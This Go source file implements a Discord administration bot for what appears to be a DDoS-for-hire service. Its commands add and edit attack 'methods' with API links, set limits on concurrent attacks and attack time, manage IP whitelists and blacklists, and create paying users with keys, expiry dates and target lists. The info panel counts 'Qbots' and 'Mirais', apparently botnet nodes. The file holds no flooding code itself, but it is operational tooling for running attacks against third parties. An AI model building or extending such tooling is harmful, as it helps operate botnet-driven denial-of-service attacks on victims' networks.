package bot

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
	"main.go/assets"
	"main.go/database"
	"main.go/logging"
)

var Id string
var bot *discordgo.Session

func Run() {
	var err error
	bot, err = discordgo.New("Bot " + database.Config.Bot)
	if err != nil {
		logging.LogError("Failed to configure Bot [BOT]", err)
		os.Exit(1)
	}
	u, err := bot.User("@me")
	if err != nil {
		logging.LogError("Failed to set User [BOT]", err)
		os.Exit(1)
	}
	Id = u.ID
	bot.AddHandler(messageHandler)
	bot.Identify.Intents = discordgo.IntentsAll
	err = bot.Open()
	if err != nil {
		logging.LogError("Failed to start Bot [BOT]", err)
		os.Exit(1)
	}
	logging.Log("Bot started [BOT]")
}

func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == Id {
		return
	}
	perms, err := s.State.UserChannelPermissions(m.Author.ID, m.ChannelID)
	if err != nil {
		return
	}
	if perms&discordgo.PermissionAdministrator == 0 {
		if strings.Split(m.Content, " ")[0] == database.Config.Prefix+"info" {
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Info",
				Description: "API-Information's:",
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "**Version**",
						Value:  "```" + database.Version + "```",
						Inline: false,
					},
					{
						Name:   "**Users Count**",
						Value:  "```" + strconv.Itoa(len(database.Users)) + "```",
						Inline: false,
					},
					{
						Name:   "**Methods Count**",
						Value:  "```" + strconv.Itoa(len(database.Methods.Methods)) + "```",
						Inline: false,
					},
					{
						Name:   "**Current Cons**",
						Value:  "```" + strconv.Itoa(database.GetActiveCons()) + "```",
						Inline: false,
					},
					{
						Name:   "**Max Global Cons**",
						Value:  "```" + strconv.Itoa(database.Config.MaxCons) + "```",
						Inline: false,
					},
					{
						Name:   "**Max Global Time**",
						Value:  "```" + strconv.Itoa(database.Config.TimeLimit) + "```",
						Inline: false,
					},
					{
						Name:   "**Powersaving**",
						Value:  "```" + strconv.FormatBool(database.Config.Powersaving) + "```",
						Inline: false,
					},
					{
						Name:   "**Debug Mode**",
						Value:  "```" + strconv.FormatBool(database.Debug) + "```",
						Inline: false,
					},
					{
						Name:   "**Prefix**",
						Value:  "```" + database.Config.Prefix + "```",
						Inline: false,
					},
					{
						Name:   "**Qbots**",
						Value:  "```" + strconv.Itoa(len(database.QBots)) + "```",
						Inline: false,
					},
					{
						Name:  "**Mirais**",
						Value: "```" + strconv.Itoa(len(database.Mirai)) + "```",
					},
				},
			})
			return
		} else {
			logging.LogWarning("User " + m.Author.Username + " tried to use a command without permission [BOT]")
			return
		}
	}
	args := strings.Split(m.Content, " ")
	switch strings.ToLower(args[0]) {
	case database.Config.Prefix + "method", database.Config.Prefix + "methods":
		if len(args) < 2 {
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Method",
				Description: "This is a list of commands",
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "**add**",
						Value:  "```Adds a method```",
						Inline: false,
					},
					{
						Name:   "**remove**",
						Value:  "```Removes a method```",
						Inline: false,
					},
					{
						Name:   "**edit**",
						Value:  "```Edits a method```",
						Inline: false,
					},
					{
						Name:   "**list**",
						Value:  "```Lists all methods```",
						Inline: false,
					},
				},
				Color: 0x00ff00,
			})
			break
		}
		switch args[1] {
		case "add":
			if len(args) < 6 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "Method",
					Description: "This is a list of commands",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**add**",
							Value:  "```Adds a method```",
							Inline: false,
						},
						{
							Name:   "**usage**",
							Value:  "```" + database.Config.Prefix + "method add <name> <role> <max time> <link>```",
							Inline: false,
						},
					},
					Color: 0x00ff00,
				})
				break
			}
			name := args[2]
			role := args[3]
			maxtime, _ := strconv.Atoi(args[4])
			link := args[5]
			// add to json file
			var method assets.Method
			method.Name = name
			method.Permissions = []string{role}
			method.Time = maxtime
			method.API = []string{link}
			method.Server = []assets.Server{}
			database.Methods.Methods = append(database.Methods.Methods, method)
			jsonVal, _ := json.MarshalIndent(database.Methods, "", "	")
			_ = ioutil.WriteFile("config/methods.json", jsonVal, 0644)
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Method",
				Description: "Added method " + name,
				Color:       0x00ff00,
			})
		case "remove":
			if len(args) < 3 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "Method",
					Description: "This is a list of commands",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**remove**",
							Value:  "```Removes a method```",
							Inline: false,
						},
						{
							Name:   "**usage**",
							Value:  "```" + database.Config.Prefix + "method remove <name>```",
							Inline: false,
						},
					},
					Color: 0x00ff00,
				})
				break
			}
			name := args[2]
			for i, method := range database.Methods.Methods {
				if method.Name == name {
					database.Methods.Methods = append(database.Methods.Methods[:i], database.Methods.Methods[i+1:]...)
					jsonVal, _ := json.MarshalIndent(database.Methods, "", "	")
					_ = ioutil.WriteFile("config/methods.json", jsonVal, 0644)
					_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
						Title:       "Method",
						Description: "Removed method " + name,
						Color:       0x00ff00,
					})
					break
				}
			}
			break
		case "edit":
			if len(args) < 6 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "Method",
					Description: "This is a list of commands",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**add**",
							Value:  "```Adds a method```",
							Inline: false,
						},
						{
							Name:   "**usage**",
							Value:  "```" + database.Config.Prefix + "method edit <name> <role> <max time> <link>```",
							Inline: false,
						},
					},
					Color: 0x00ff00,
				})
				break
			}
			name := args[2]
			role := args[3]
			maxtime, _ := strconv.Atoi(args[4])
			link := args[5]
			for i, method := range database.Methods.Methods {
				if method.Name == name {
					database.Methods.Methods[i].Permissions = []string{role}
					database.Methods.Methods[i].Time = maxtime
					database.Methods.Methods[i].API = []string{link}
					database.Methods.Methods[i].Server = []assets.Server{}
					jsonVal, _ := json.MarshalIndent(database.Methods, "", "	")
					_ = ioutil.WriteFile("config/methods.json", jsonVal, 0644)
					_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
						Title:       "Method",
						Description: "Edited method " + name,
						Color:       0x00ff00,
					})
					break
				}
			}
			break
		case "list":
			var methods string
			for _, method := range database.Methods.Methods {
				methods = methods + "\r\n" + method.Name + " - " + method.QBOT.Command
			}
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Methods",
				Description: "```" + methods + "```",
				Color:       0x00ff00,
			})
		}
	case database.Config.Prefix + "help":
		_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
			Title:       "Help",
			Description: "This is a list of commands",
			Fields: []*discordgo.MessageEmbedField{
				{
					Name:   "**Help**",
					Value:  "```Shows this message```",
					Inline: false,
				},
				{
					Name:   "**User**",
					Value:  "```Manage users```",
					Inline: false,
				},
				{
					Name:   "**Method**",
					Value:  "```Manages the methods```",
					Inline: false,
				},
				{
					Name:   "**Kill**",
					Value:  "```Kills the bot```",
					Inline: false,
				},
				{
					Name:   "**Restart**",
					Value:  "```Restarts the bot```",
					Inline: false,
				},
				{
					Name:   "**Configure**",
					Value:  "```Changes the configuration```",
					Inline: false,
				},
				{
					Name:   "**Whitelist**",
					Value:  "```Manages the whitelist```",
					Inline: false,
				},
				{
					Name:   "**Blacklist**",
					Value:  "```Manages the blacklist```",
					Inline: false,
				},
				{
					Name:   "**Info**",
					Value:  "```Shows info about the API```",
					Inline: false,
				},
			},
			Color: 0x00ff00,
		})
		break
	case database.Config.Prefix + "info":
		_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
			Title:       "Info",
			Description: "API-Information's:",
			Fields: []*discordgo.MessageEmbedField{
				{
					Name:   "**Version**",
					Value:  "```" + database.Version + "```",
					Inline: false,
				},
				{
					Name:   "**Users Count**",
					Value:  "```" + strconv.Itoa(len(database.Users)) + "```",
					Inline: false,
				},
				{
					Name:   "**Methods Count**",
					Value:  "```" + strconv.Itoa(len(database.Methods.Methods)) + "```",
					Inline: false,
				},
				{
					Name:   "**Current Cons**",
					Value:  "```" + strconv.Itoa(database.GetActiveCons()) + "```",
					Inline: false,
				},
				{
					Name:   "**Max Global Cons**",
					Value:  "```" + strconv.Itoa(database.Config.MaxCons) + "```",
					Inline: false,
				},
				{
					Name:   "**Max Global Time**",
					Value:  "```" + strconv.Itoa(database.Config.TimeLimit) + "```",
					Inline: false,
				},
				{
					Name:   "**Powersaving**",
					Value:  "```" + strconv.FormatBool(database.Config.Powersaving) + "```",
					Inline: false,
				},
				{
					Name:   "**Debug Mode**",
					Value:  "```" + strconv.FormatBool(database.Debug) + "```",
					Inline: false,
				},
				{
					Name:   "**Prefix**",
					Value:  "```" + database.Config.Prefix + "```",
					Inline: false,
				},
				{
					Name:   "**Qbots**",
					Value:  "```" + strconv.Itoa(len(database.QBots)) + "```",
					Inline: false,
				},
				{
					Name:  "**Mirais**",
					Value: "```" + strconv.Itoa(len(database.Mirai)) + "```",
				},
			},
		})
	case database.Config.Prefix + "whitelist":
		if len(args) < 2 {
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Whitelist",
				Description: "This is a list of commands",
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "**Usage**",
						Value:  "```" + database.Config.Prefix + "whitelist <add/remove/list> <ip>```",
						Inline: false,
					},
				},
				Color: 0x00ff00,
			})
			break
		}
		switch args[1] {
		case "add":
			if len(args) < 3 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "Whitelist",
					Description: "This is a list of commands",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**Usage**",
							Value:  "```" + database.Config.Prefix + "whitelist add <ip>```",
							Inline: false,
						},
					},
					Color: 0x00ff00,
				})
				break
			}
			database.Config.Whitelist = append(database.Config.Whitelist, args[2])
			jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
			_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Whitelist",
				Description: "Added " + args[2] + " to the whitelist",
				Color:       0x00ff00,
			})
			break
		case "remove":
			if len(args) < 3 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "Whitelist",
					Description: "This is a list of commands",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**Usage**",
							Value:  "```" + database.Config.Prefix + "whitelist remove <ip>```",
							Inline: false,
						},
					},
					Color: 0x00ff00,
				})
				break
			}
			for i, v := range database.Config.Whitelist {
				if v == args[2] {
					database.Config.Whitelist = append(database.Config.Whitelist[:i], database.Config.Whitelist[i+1:]...)
					jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
					_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
					_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
						Title:       "Whitelist",
						Description: "Removed " + args[2] + " from the whitelist",
						Color:       0x00ff00,
					})
					break
				}
			}
			break
		case "list":
			var list string
			for _, v := range database.Config.Whitelist {
				list = list + "\r\n" + v
			}
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Whitelist",
				Description: "```" + list + "```",
				Color:       0x00ff00,
			})
			break
		}
	case database.Config.Prefix + "blacklist":
		if len(args) < 2 {
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Blacklist",
				Description: "Manage the blacklist",
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "**Usage**",
						Value:  "```" + database.Config.Prefix + "blacklist <add/remove/list> <ip>```",
						Inline: false,
					},
				},
				Color: 0x00ff00,
			})
			break
		}
		switch args[1] {
		case "add":
			if len(args) < 3 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "Blacklist",
					Description: "This is a list of commands",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**Usage**",
							Value:  "```" + database.Config.Prefix + "blacklist add <ip>```",
							Inline: false,
						},
					},
					Color: 0x00ff00,
				})
				break
			}
			database.Config.Blacklist = append(database.Config.Blacklist, args[2])
			jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
			_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Blacklist",
				Description: "Added " + args[2] + " to the blacklist",
				Color:       0x00ff00,
			})
			break
		case "remove":
			if len(args) < 3 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "Blacklist",
					Description: "This is a list of commands",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**Usage**",
							Value:  "```" + database.Config.Prefix + "blacklist remove <ip>```",
							Inline: false,
						},
					},
					Color: 0x00ff00,
				})
				break
			}
			for i, v := range database.Config.Blacklist {
				if v == args[2] {
					database.Config.Blacklist = append(database.Config.Blacklist[:i], database.Config.Blacklist[i+1:]...)
					jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
					_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
					_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
						Title:       "Blacklist",
						Description: "Removed " + args[2] + " from the blacklist",
						Color:       0x00ff00,
					})
					break
				}
			}
			break
		case "list":
			var list string
			for _, v := range database.Config.Blacklist {
				list = list + "\r\n" + v
			}
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Blacklist",
				Description: "```" + list + "```",
				Color:       0x00ff00,
			})
			break
		}
	case database.Config.Prefix + "configure":
		// configure <con/time/prefix/screen/powersaving/debug> <value>
		if len(args) < 3 {
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Configure",
				Description: "This is a list of commands",
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "**Usage**",
						Value:  "```" + database.Config.Prefix + "configure <con/time/prefix/powersaving/debug> <value>```",
						Inline: false,
					},
				},
				Color: 0x00ff00,
			})
			break
		}
		switch args[1] {
		case "debug":
			if args[2] == "true" {
				database.Debug = true
			} else {
				database.Debug = false
			}
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Configure",
				Description: "Changed debug to " + args[2],
				Color:       0x00ff00,
			})
			break
		case "con":
			database.Config.MaxCons, _ = strconv.Atoi(args[2])
			jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
			_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Configure",
				Description: "Changed concurrency to " + args[2],
				Color:       0x00ff00,
			})
			break
		case "time":
			database.Config.TimeLimit, _ = strconv.Atoi(args[2])
			jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
			_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Configure",
				Description: "Changed time to " + args[2],
				Color:       0x00ff00,
			})
			break
		case "prefix":
			database.Config.Prefix = args[2]
			jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
			_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Configure",
				Description: "Changed prefix to " + args[2],
				Color:       0x00ff00,
			})
			break
		case "screen":
			if args[2] == "true" {
				database.Config.Screen = true
			} else {
				database.Config.Screen = false
			}
			jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
			_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Configure",
				Description: "Changed screen to " + args[2],
				Color:       0x00ff00,
			})
			break
		case "powersaving":
			if args[2] == "true" {
				database.Config.Powersaving = true
			} else {
				database.Config.Powersaving = false
			}
			jsonVal, _ := json.MarshalIndent(database.Config, "", "	")
			_ = ioutil.WriteFile("config/config.json", jsonVal, 0644)
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "Configure",
				Description: "Changed powersaving to " + args[2],
				Color:       0x00ff00,
			})
			break
		}
	case database.Config.Prefix + "kill":
		_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
			Title:       "Kill",
			Description: "Killing bot",
			Color:       0xff0000,
		})
		os.Exit(0)
	case database.Config.Prefix + "restart":
		_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
			Title:       "Restart",
			Description: "Restarting bot",
			Color:       0xff0000,
		})
		if len(os.Args) == 2 {
			app := os.Args[0]
			cmd := exec.Command(app)
			go func() {
				err := cmd.Run()
				if err != nil {
					log.Fatal(err)
				}
			}()
		} else {
			app := os.Args[0]
			cmd := exec.Command(app)
			go func() {
				err := cmd.Run()
				if err != nil {
					log.Fatal(err)
				}
			}()
		}
		time.Sleep(3 * time.Second)
		os.Exit(0)
	case database.Config.Prefix + "user", database.Config.Prefix + "users":
		if len(args) < 2 {
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "User",
				Description: "This is a list of commands",
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "**add**",
						Value:  "```Adds a user```",
						Inline: false,
					},
					{
						Name:   "**remove**",
						Value:  "```Removes a user```",
						Inline: false,
					},
					{
						Name:   "**edit**",
						Value:  "```Edits a user```",
						Inline: false,
					},
					{
						Name:   "**list**",
						Value:  "```Lists all users```",
						Inline: false,
					},
				},
			})
			return
		}
		switch args[1] {
		case "add":
			if len(args) < 7 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "User",
					Description: "This is usage of the add command",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**add**",
							Value:  "```Adds a user```",
							Inline: false,
						},
						{
							Name:   "**Usage**",
							Value:  "```user add <username> <role> <time> <con> <days> <cool down>```",
							Inline: false,
						},
					},
				})
				return
			}
			id := len(database.Users) + rand.Intn(10000)
			for _, user := range database.Users {
				if user.Name == args[2] {
					_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
						Title:       "User",
						Description: "This user already exists",
						Color:       0xff0000,
					})
					return
				}
				if user.ID == id {
					id = len(database.Users) + rand.Intn(len(user.Name)) + 1 + rand.Intn(10000)
				}
			}
			var user assets.User
			user.Name = args[2]
			user.Key = args[2] + time.Now().Format("02-01-2006")
			user.Role = args[3]
			user.MaxTime, _ = strconv.Atoi(args[4])
			user.Concurrent, _ = strconv.Atoi(args[5])
			user.Banned = 0
			days, _ := strconv.Atoi(args[6])
			user.Expiry = time.Now().AddDate(0, 0, days).Format("02-01-2006")
			user.ID = id
			user.HasCooldown = false
			user.Cooldown, err = strconv.Atoi(args[7])
			if err != nil {
				fmt.Println(err)
			}
			database.CreateUser(user)
			database.Cons.Current = append(database.Cons.Current, assets.Concurrent{User: user, Targets: []string{}})
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "User",
				Description: "User " + user.Name + " has been **added**",
			})
			break
		case "remove":
			if len(args) < 3 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "User",
					Description: "This is usage of the remove command",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**remove**",
							Value:  "```Removes a user```",
							Inline: false,
						},
						{
							Name:   "**Usage**",
							Value:  "```user remove <username>```",
							Inline: false,
						},
					},
				})
				return
			}
			database.DeleteUser(args[2])
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "User",
				Description: "User " + args[2] + " **removed**",
			})
			break
		case "edit":
			if len(args) < 9 {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "User",
					Description: "This is usage of the edit command",
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**edit**",
							Value:  "```Edits a user```",
							Inline: false,
						},
						{
							Name:   "**Usage**",
							Value:  "```user edit <username> <key> <role> <maxtime> <max Cons> <banned> <expiry> <cool down>```",
							Inline: false,
						},
					},
				})
				return
			}
			var user assets.User
			user = database.GetUser(args[2])
			user.Name = args[2]
			user.Key = args[3]
			user.Role = args[4]
			user.MaxTime, err = strconv.Atoi(args[5])
			if err != nil {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "User",
					Description: err.Error(),
				})
				logging.LogError("Failed to edit user "+user.Name, err)
				return
			}
			user.Concurrent, err = strconv.Atoi(args[6])
			if err != nil {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "User",
					Description: err.Error(),
				})
				logging.LogError("Failed to edit user "+user.Name, err)
				return
			}
			if args[7] == "true" || args[7] == "1" {
				user.Banned = 1
			} else {
				user.Banned = 0
			}
			days, err := strconv.Atoi(args[8])
			user.Cooldown, err = strconv.Atoi(args[9])
			if err != nil {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "User",
					Description: err.Error(),
				})
				logging.LogError("Failed to edit user "+user.Name, err)
				return
			}
			user.Expiry = time.Now().AddDate(0, 0, days).Format("02-01-2006")
			err = database.UpdateUser(user)
			if err != nil {
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "User",
					Description: "User " + user.Name + " **not found**",
				})
				logging.LogError("Failed to edit user "+user.Name, err)
				return
			}
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "User",
				Description: "User " + user.Name + " has been **edited**",
			})
			break
		case "list", "show", "plan":
			if len(args) < 3 {
				var users string
				for _, user := range database.Users {
					users = users + "\r\n" + user.Name
				}
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "Users",
					Description: "```" + users + "```",
				})
			} else {
				user := database.GetUser(args[2])
				_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
					Title:       "User",
					Description: "User " + user.Name,
					Fields: []*discordgo.MessageEmbedField{
						{
							Name:   "**Key**",
							Value:  user.Key,
							Inline: false,
						},
						{
							Name:   "**Role**",
							Value:  user.Role,
							Inline: false,
						},
						{
							Name:   "**Max Time**",
							Value:  strconv.Itoa(user.MaxTime),
							Inline: false,
						},
						{
							Name:   "**Max Concurrent**",
							Value:  strconv.Itoa(user.Concurrent),
							Inline: false,
						},
						{
							Name:   "**Banned**",
							Value:  strconv.Itoa(user.Banned),
							Inline: false,
						},
						{
							Name:   "**Expiry**",
							Value:  user.Expiry,
							Inline: false,
						},
						{
							Name:   "**Cooldown**",
							Value:  strconv.Itoa(user.Cooldown),
							Inline: false,
						},
					},
				})
			}
			break
		default:
			_, _ = s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
				Title:       "User",
				Description: "This is usage of the user command",
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "**add**",
						Value:  "```Adds a user```",
						Inline: false,
					},
					{
						Name:   "**list**",
						Value:  "```Lists all users```",
						Inline: false,
					},
					{
						Name:   "**remove**",
						Value:  "```Removes a user```",
						Inline: false,
					},
				},
			})
			break
		}
	}
}
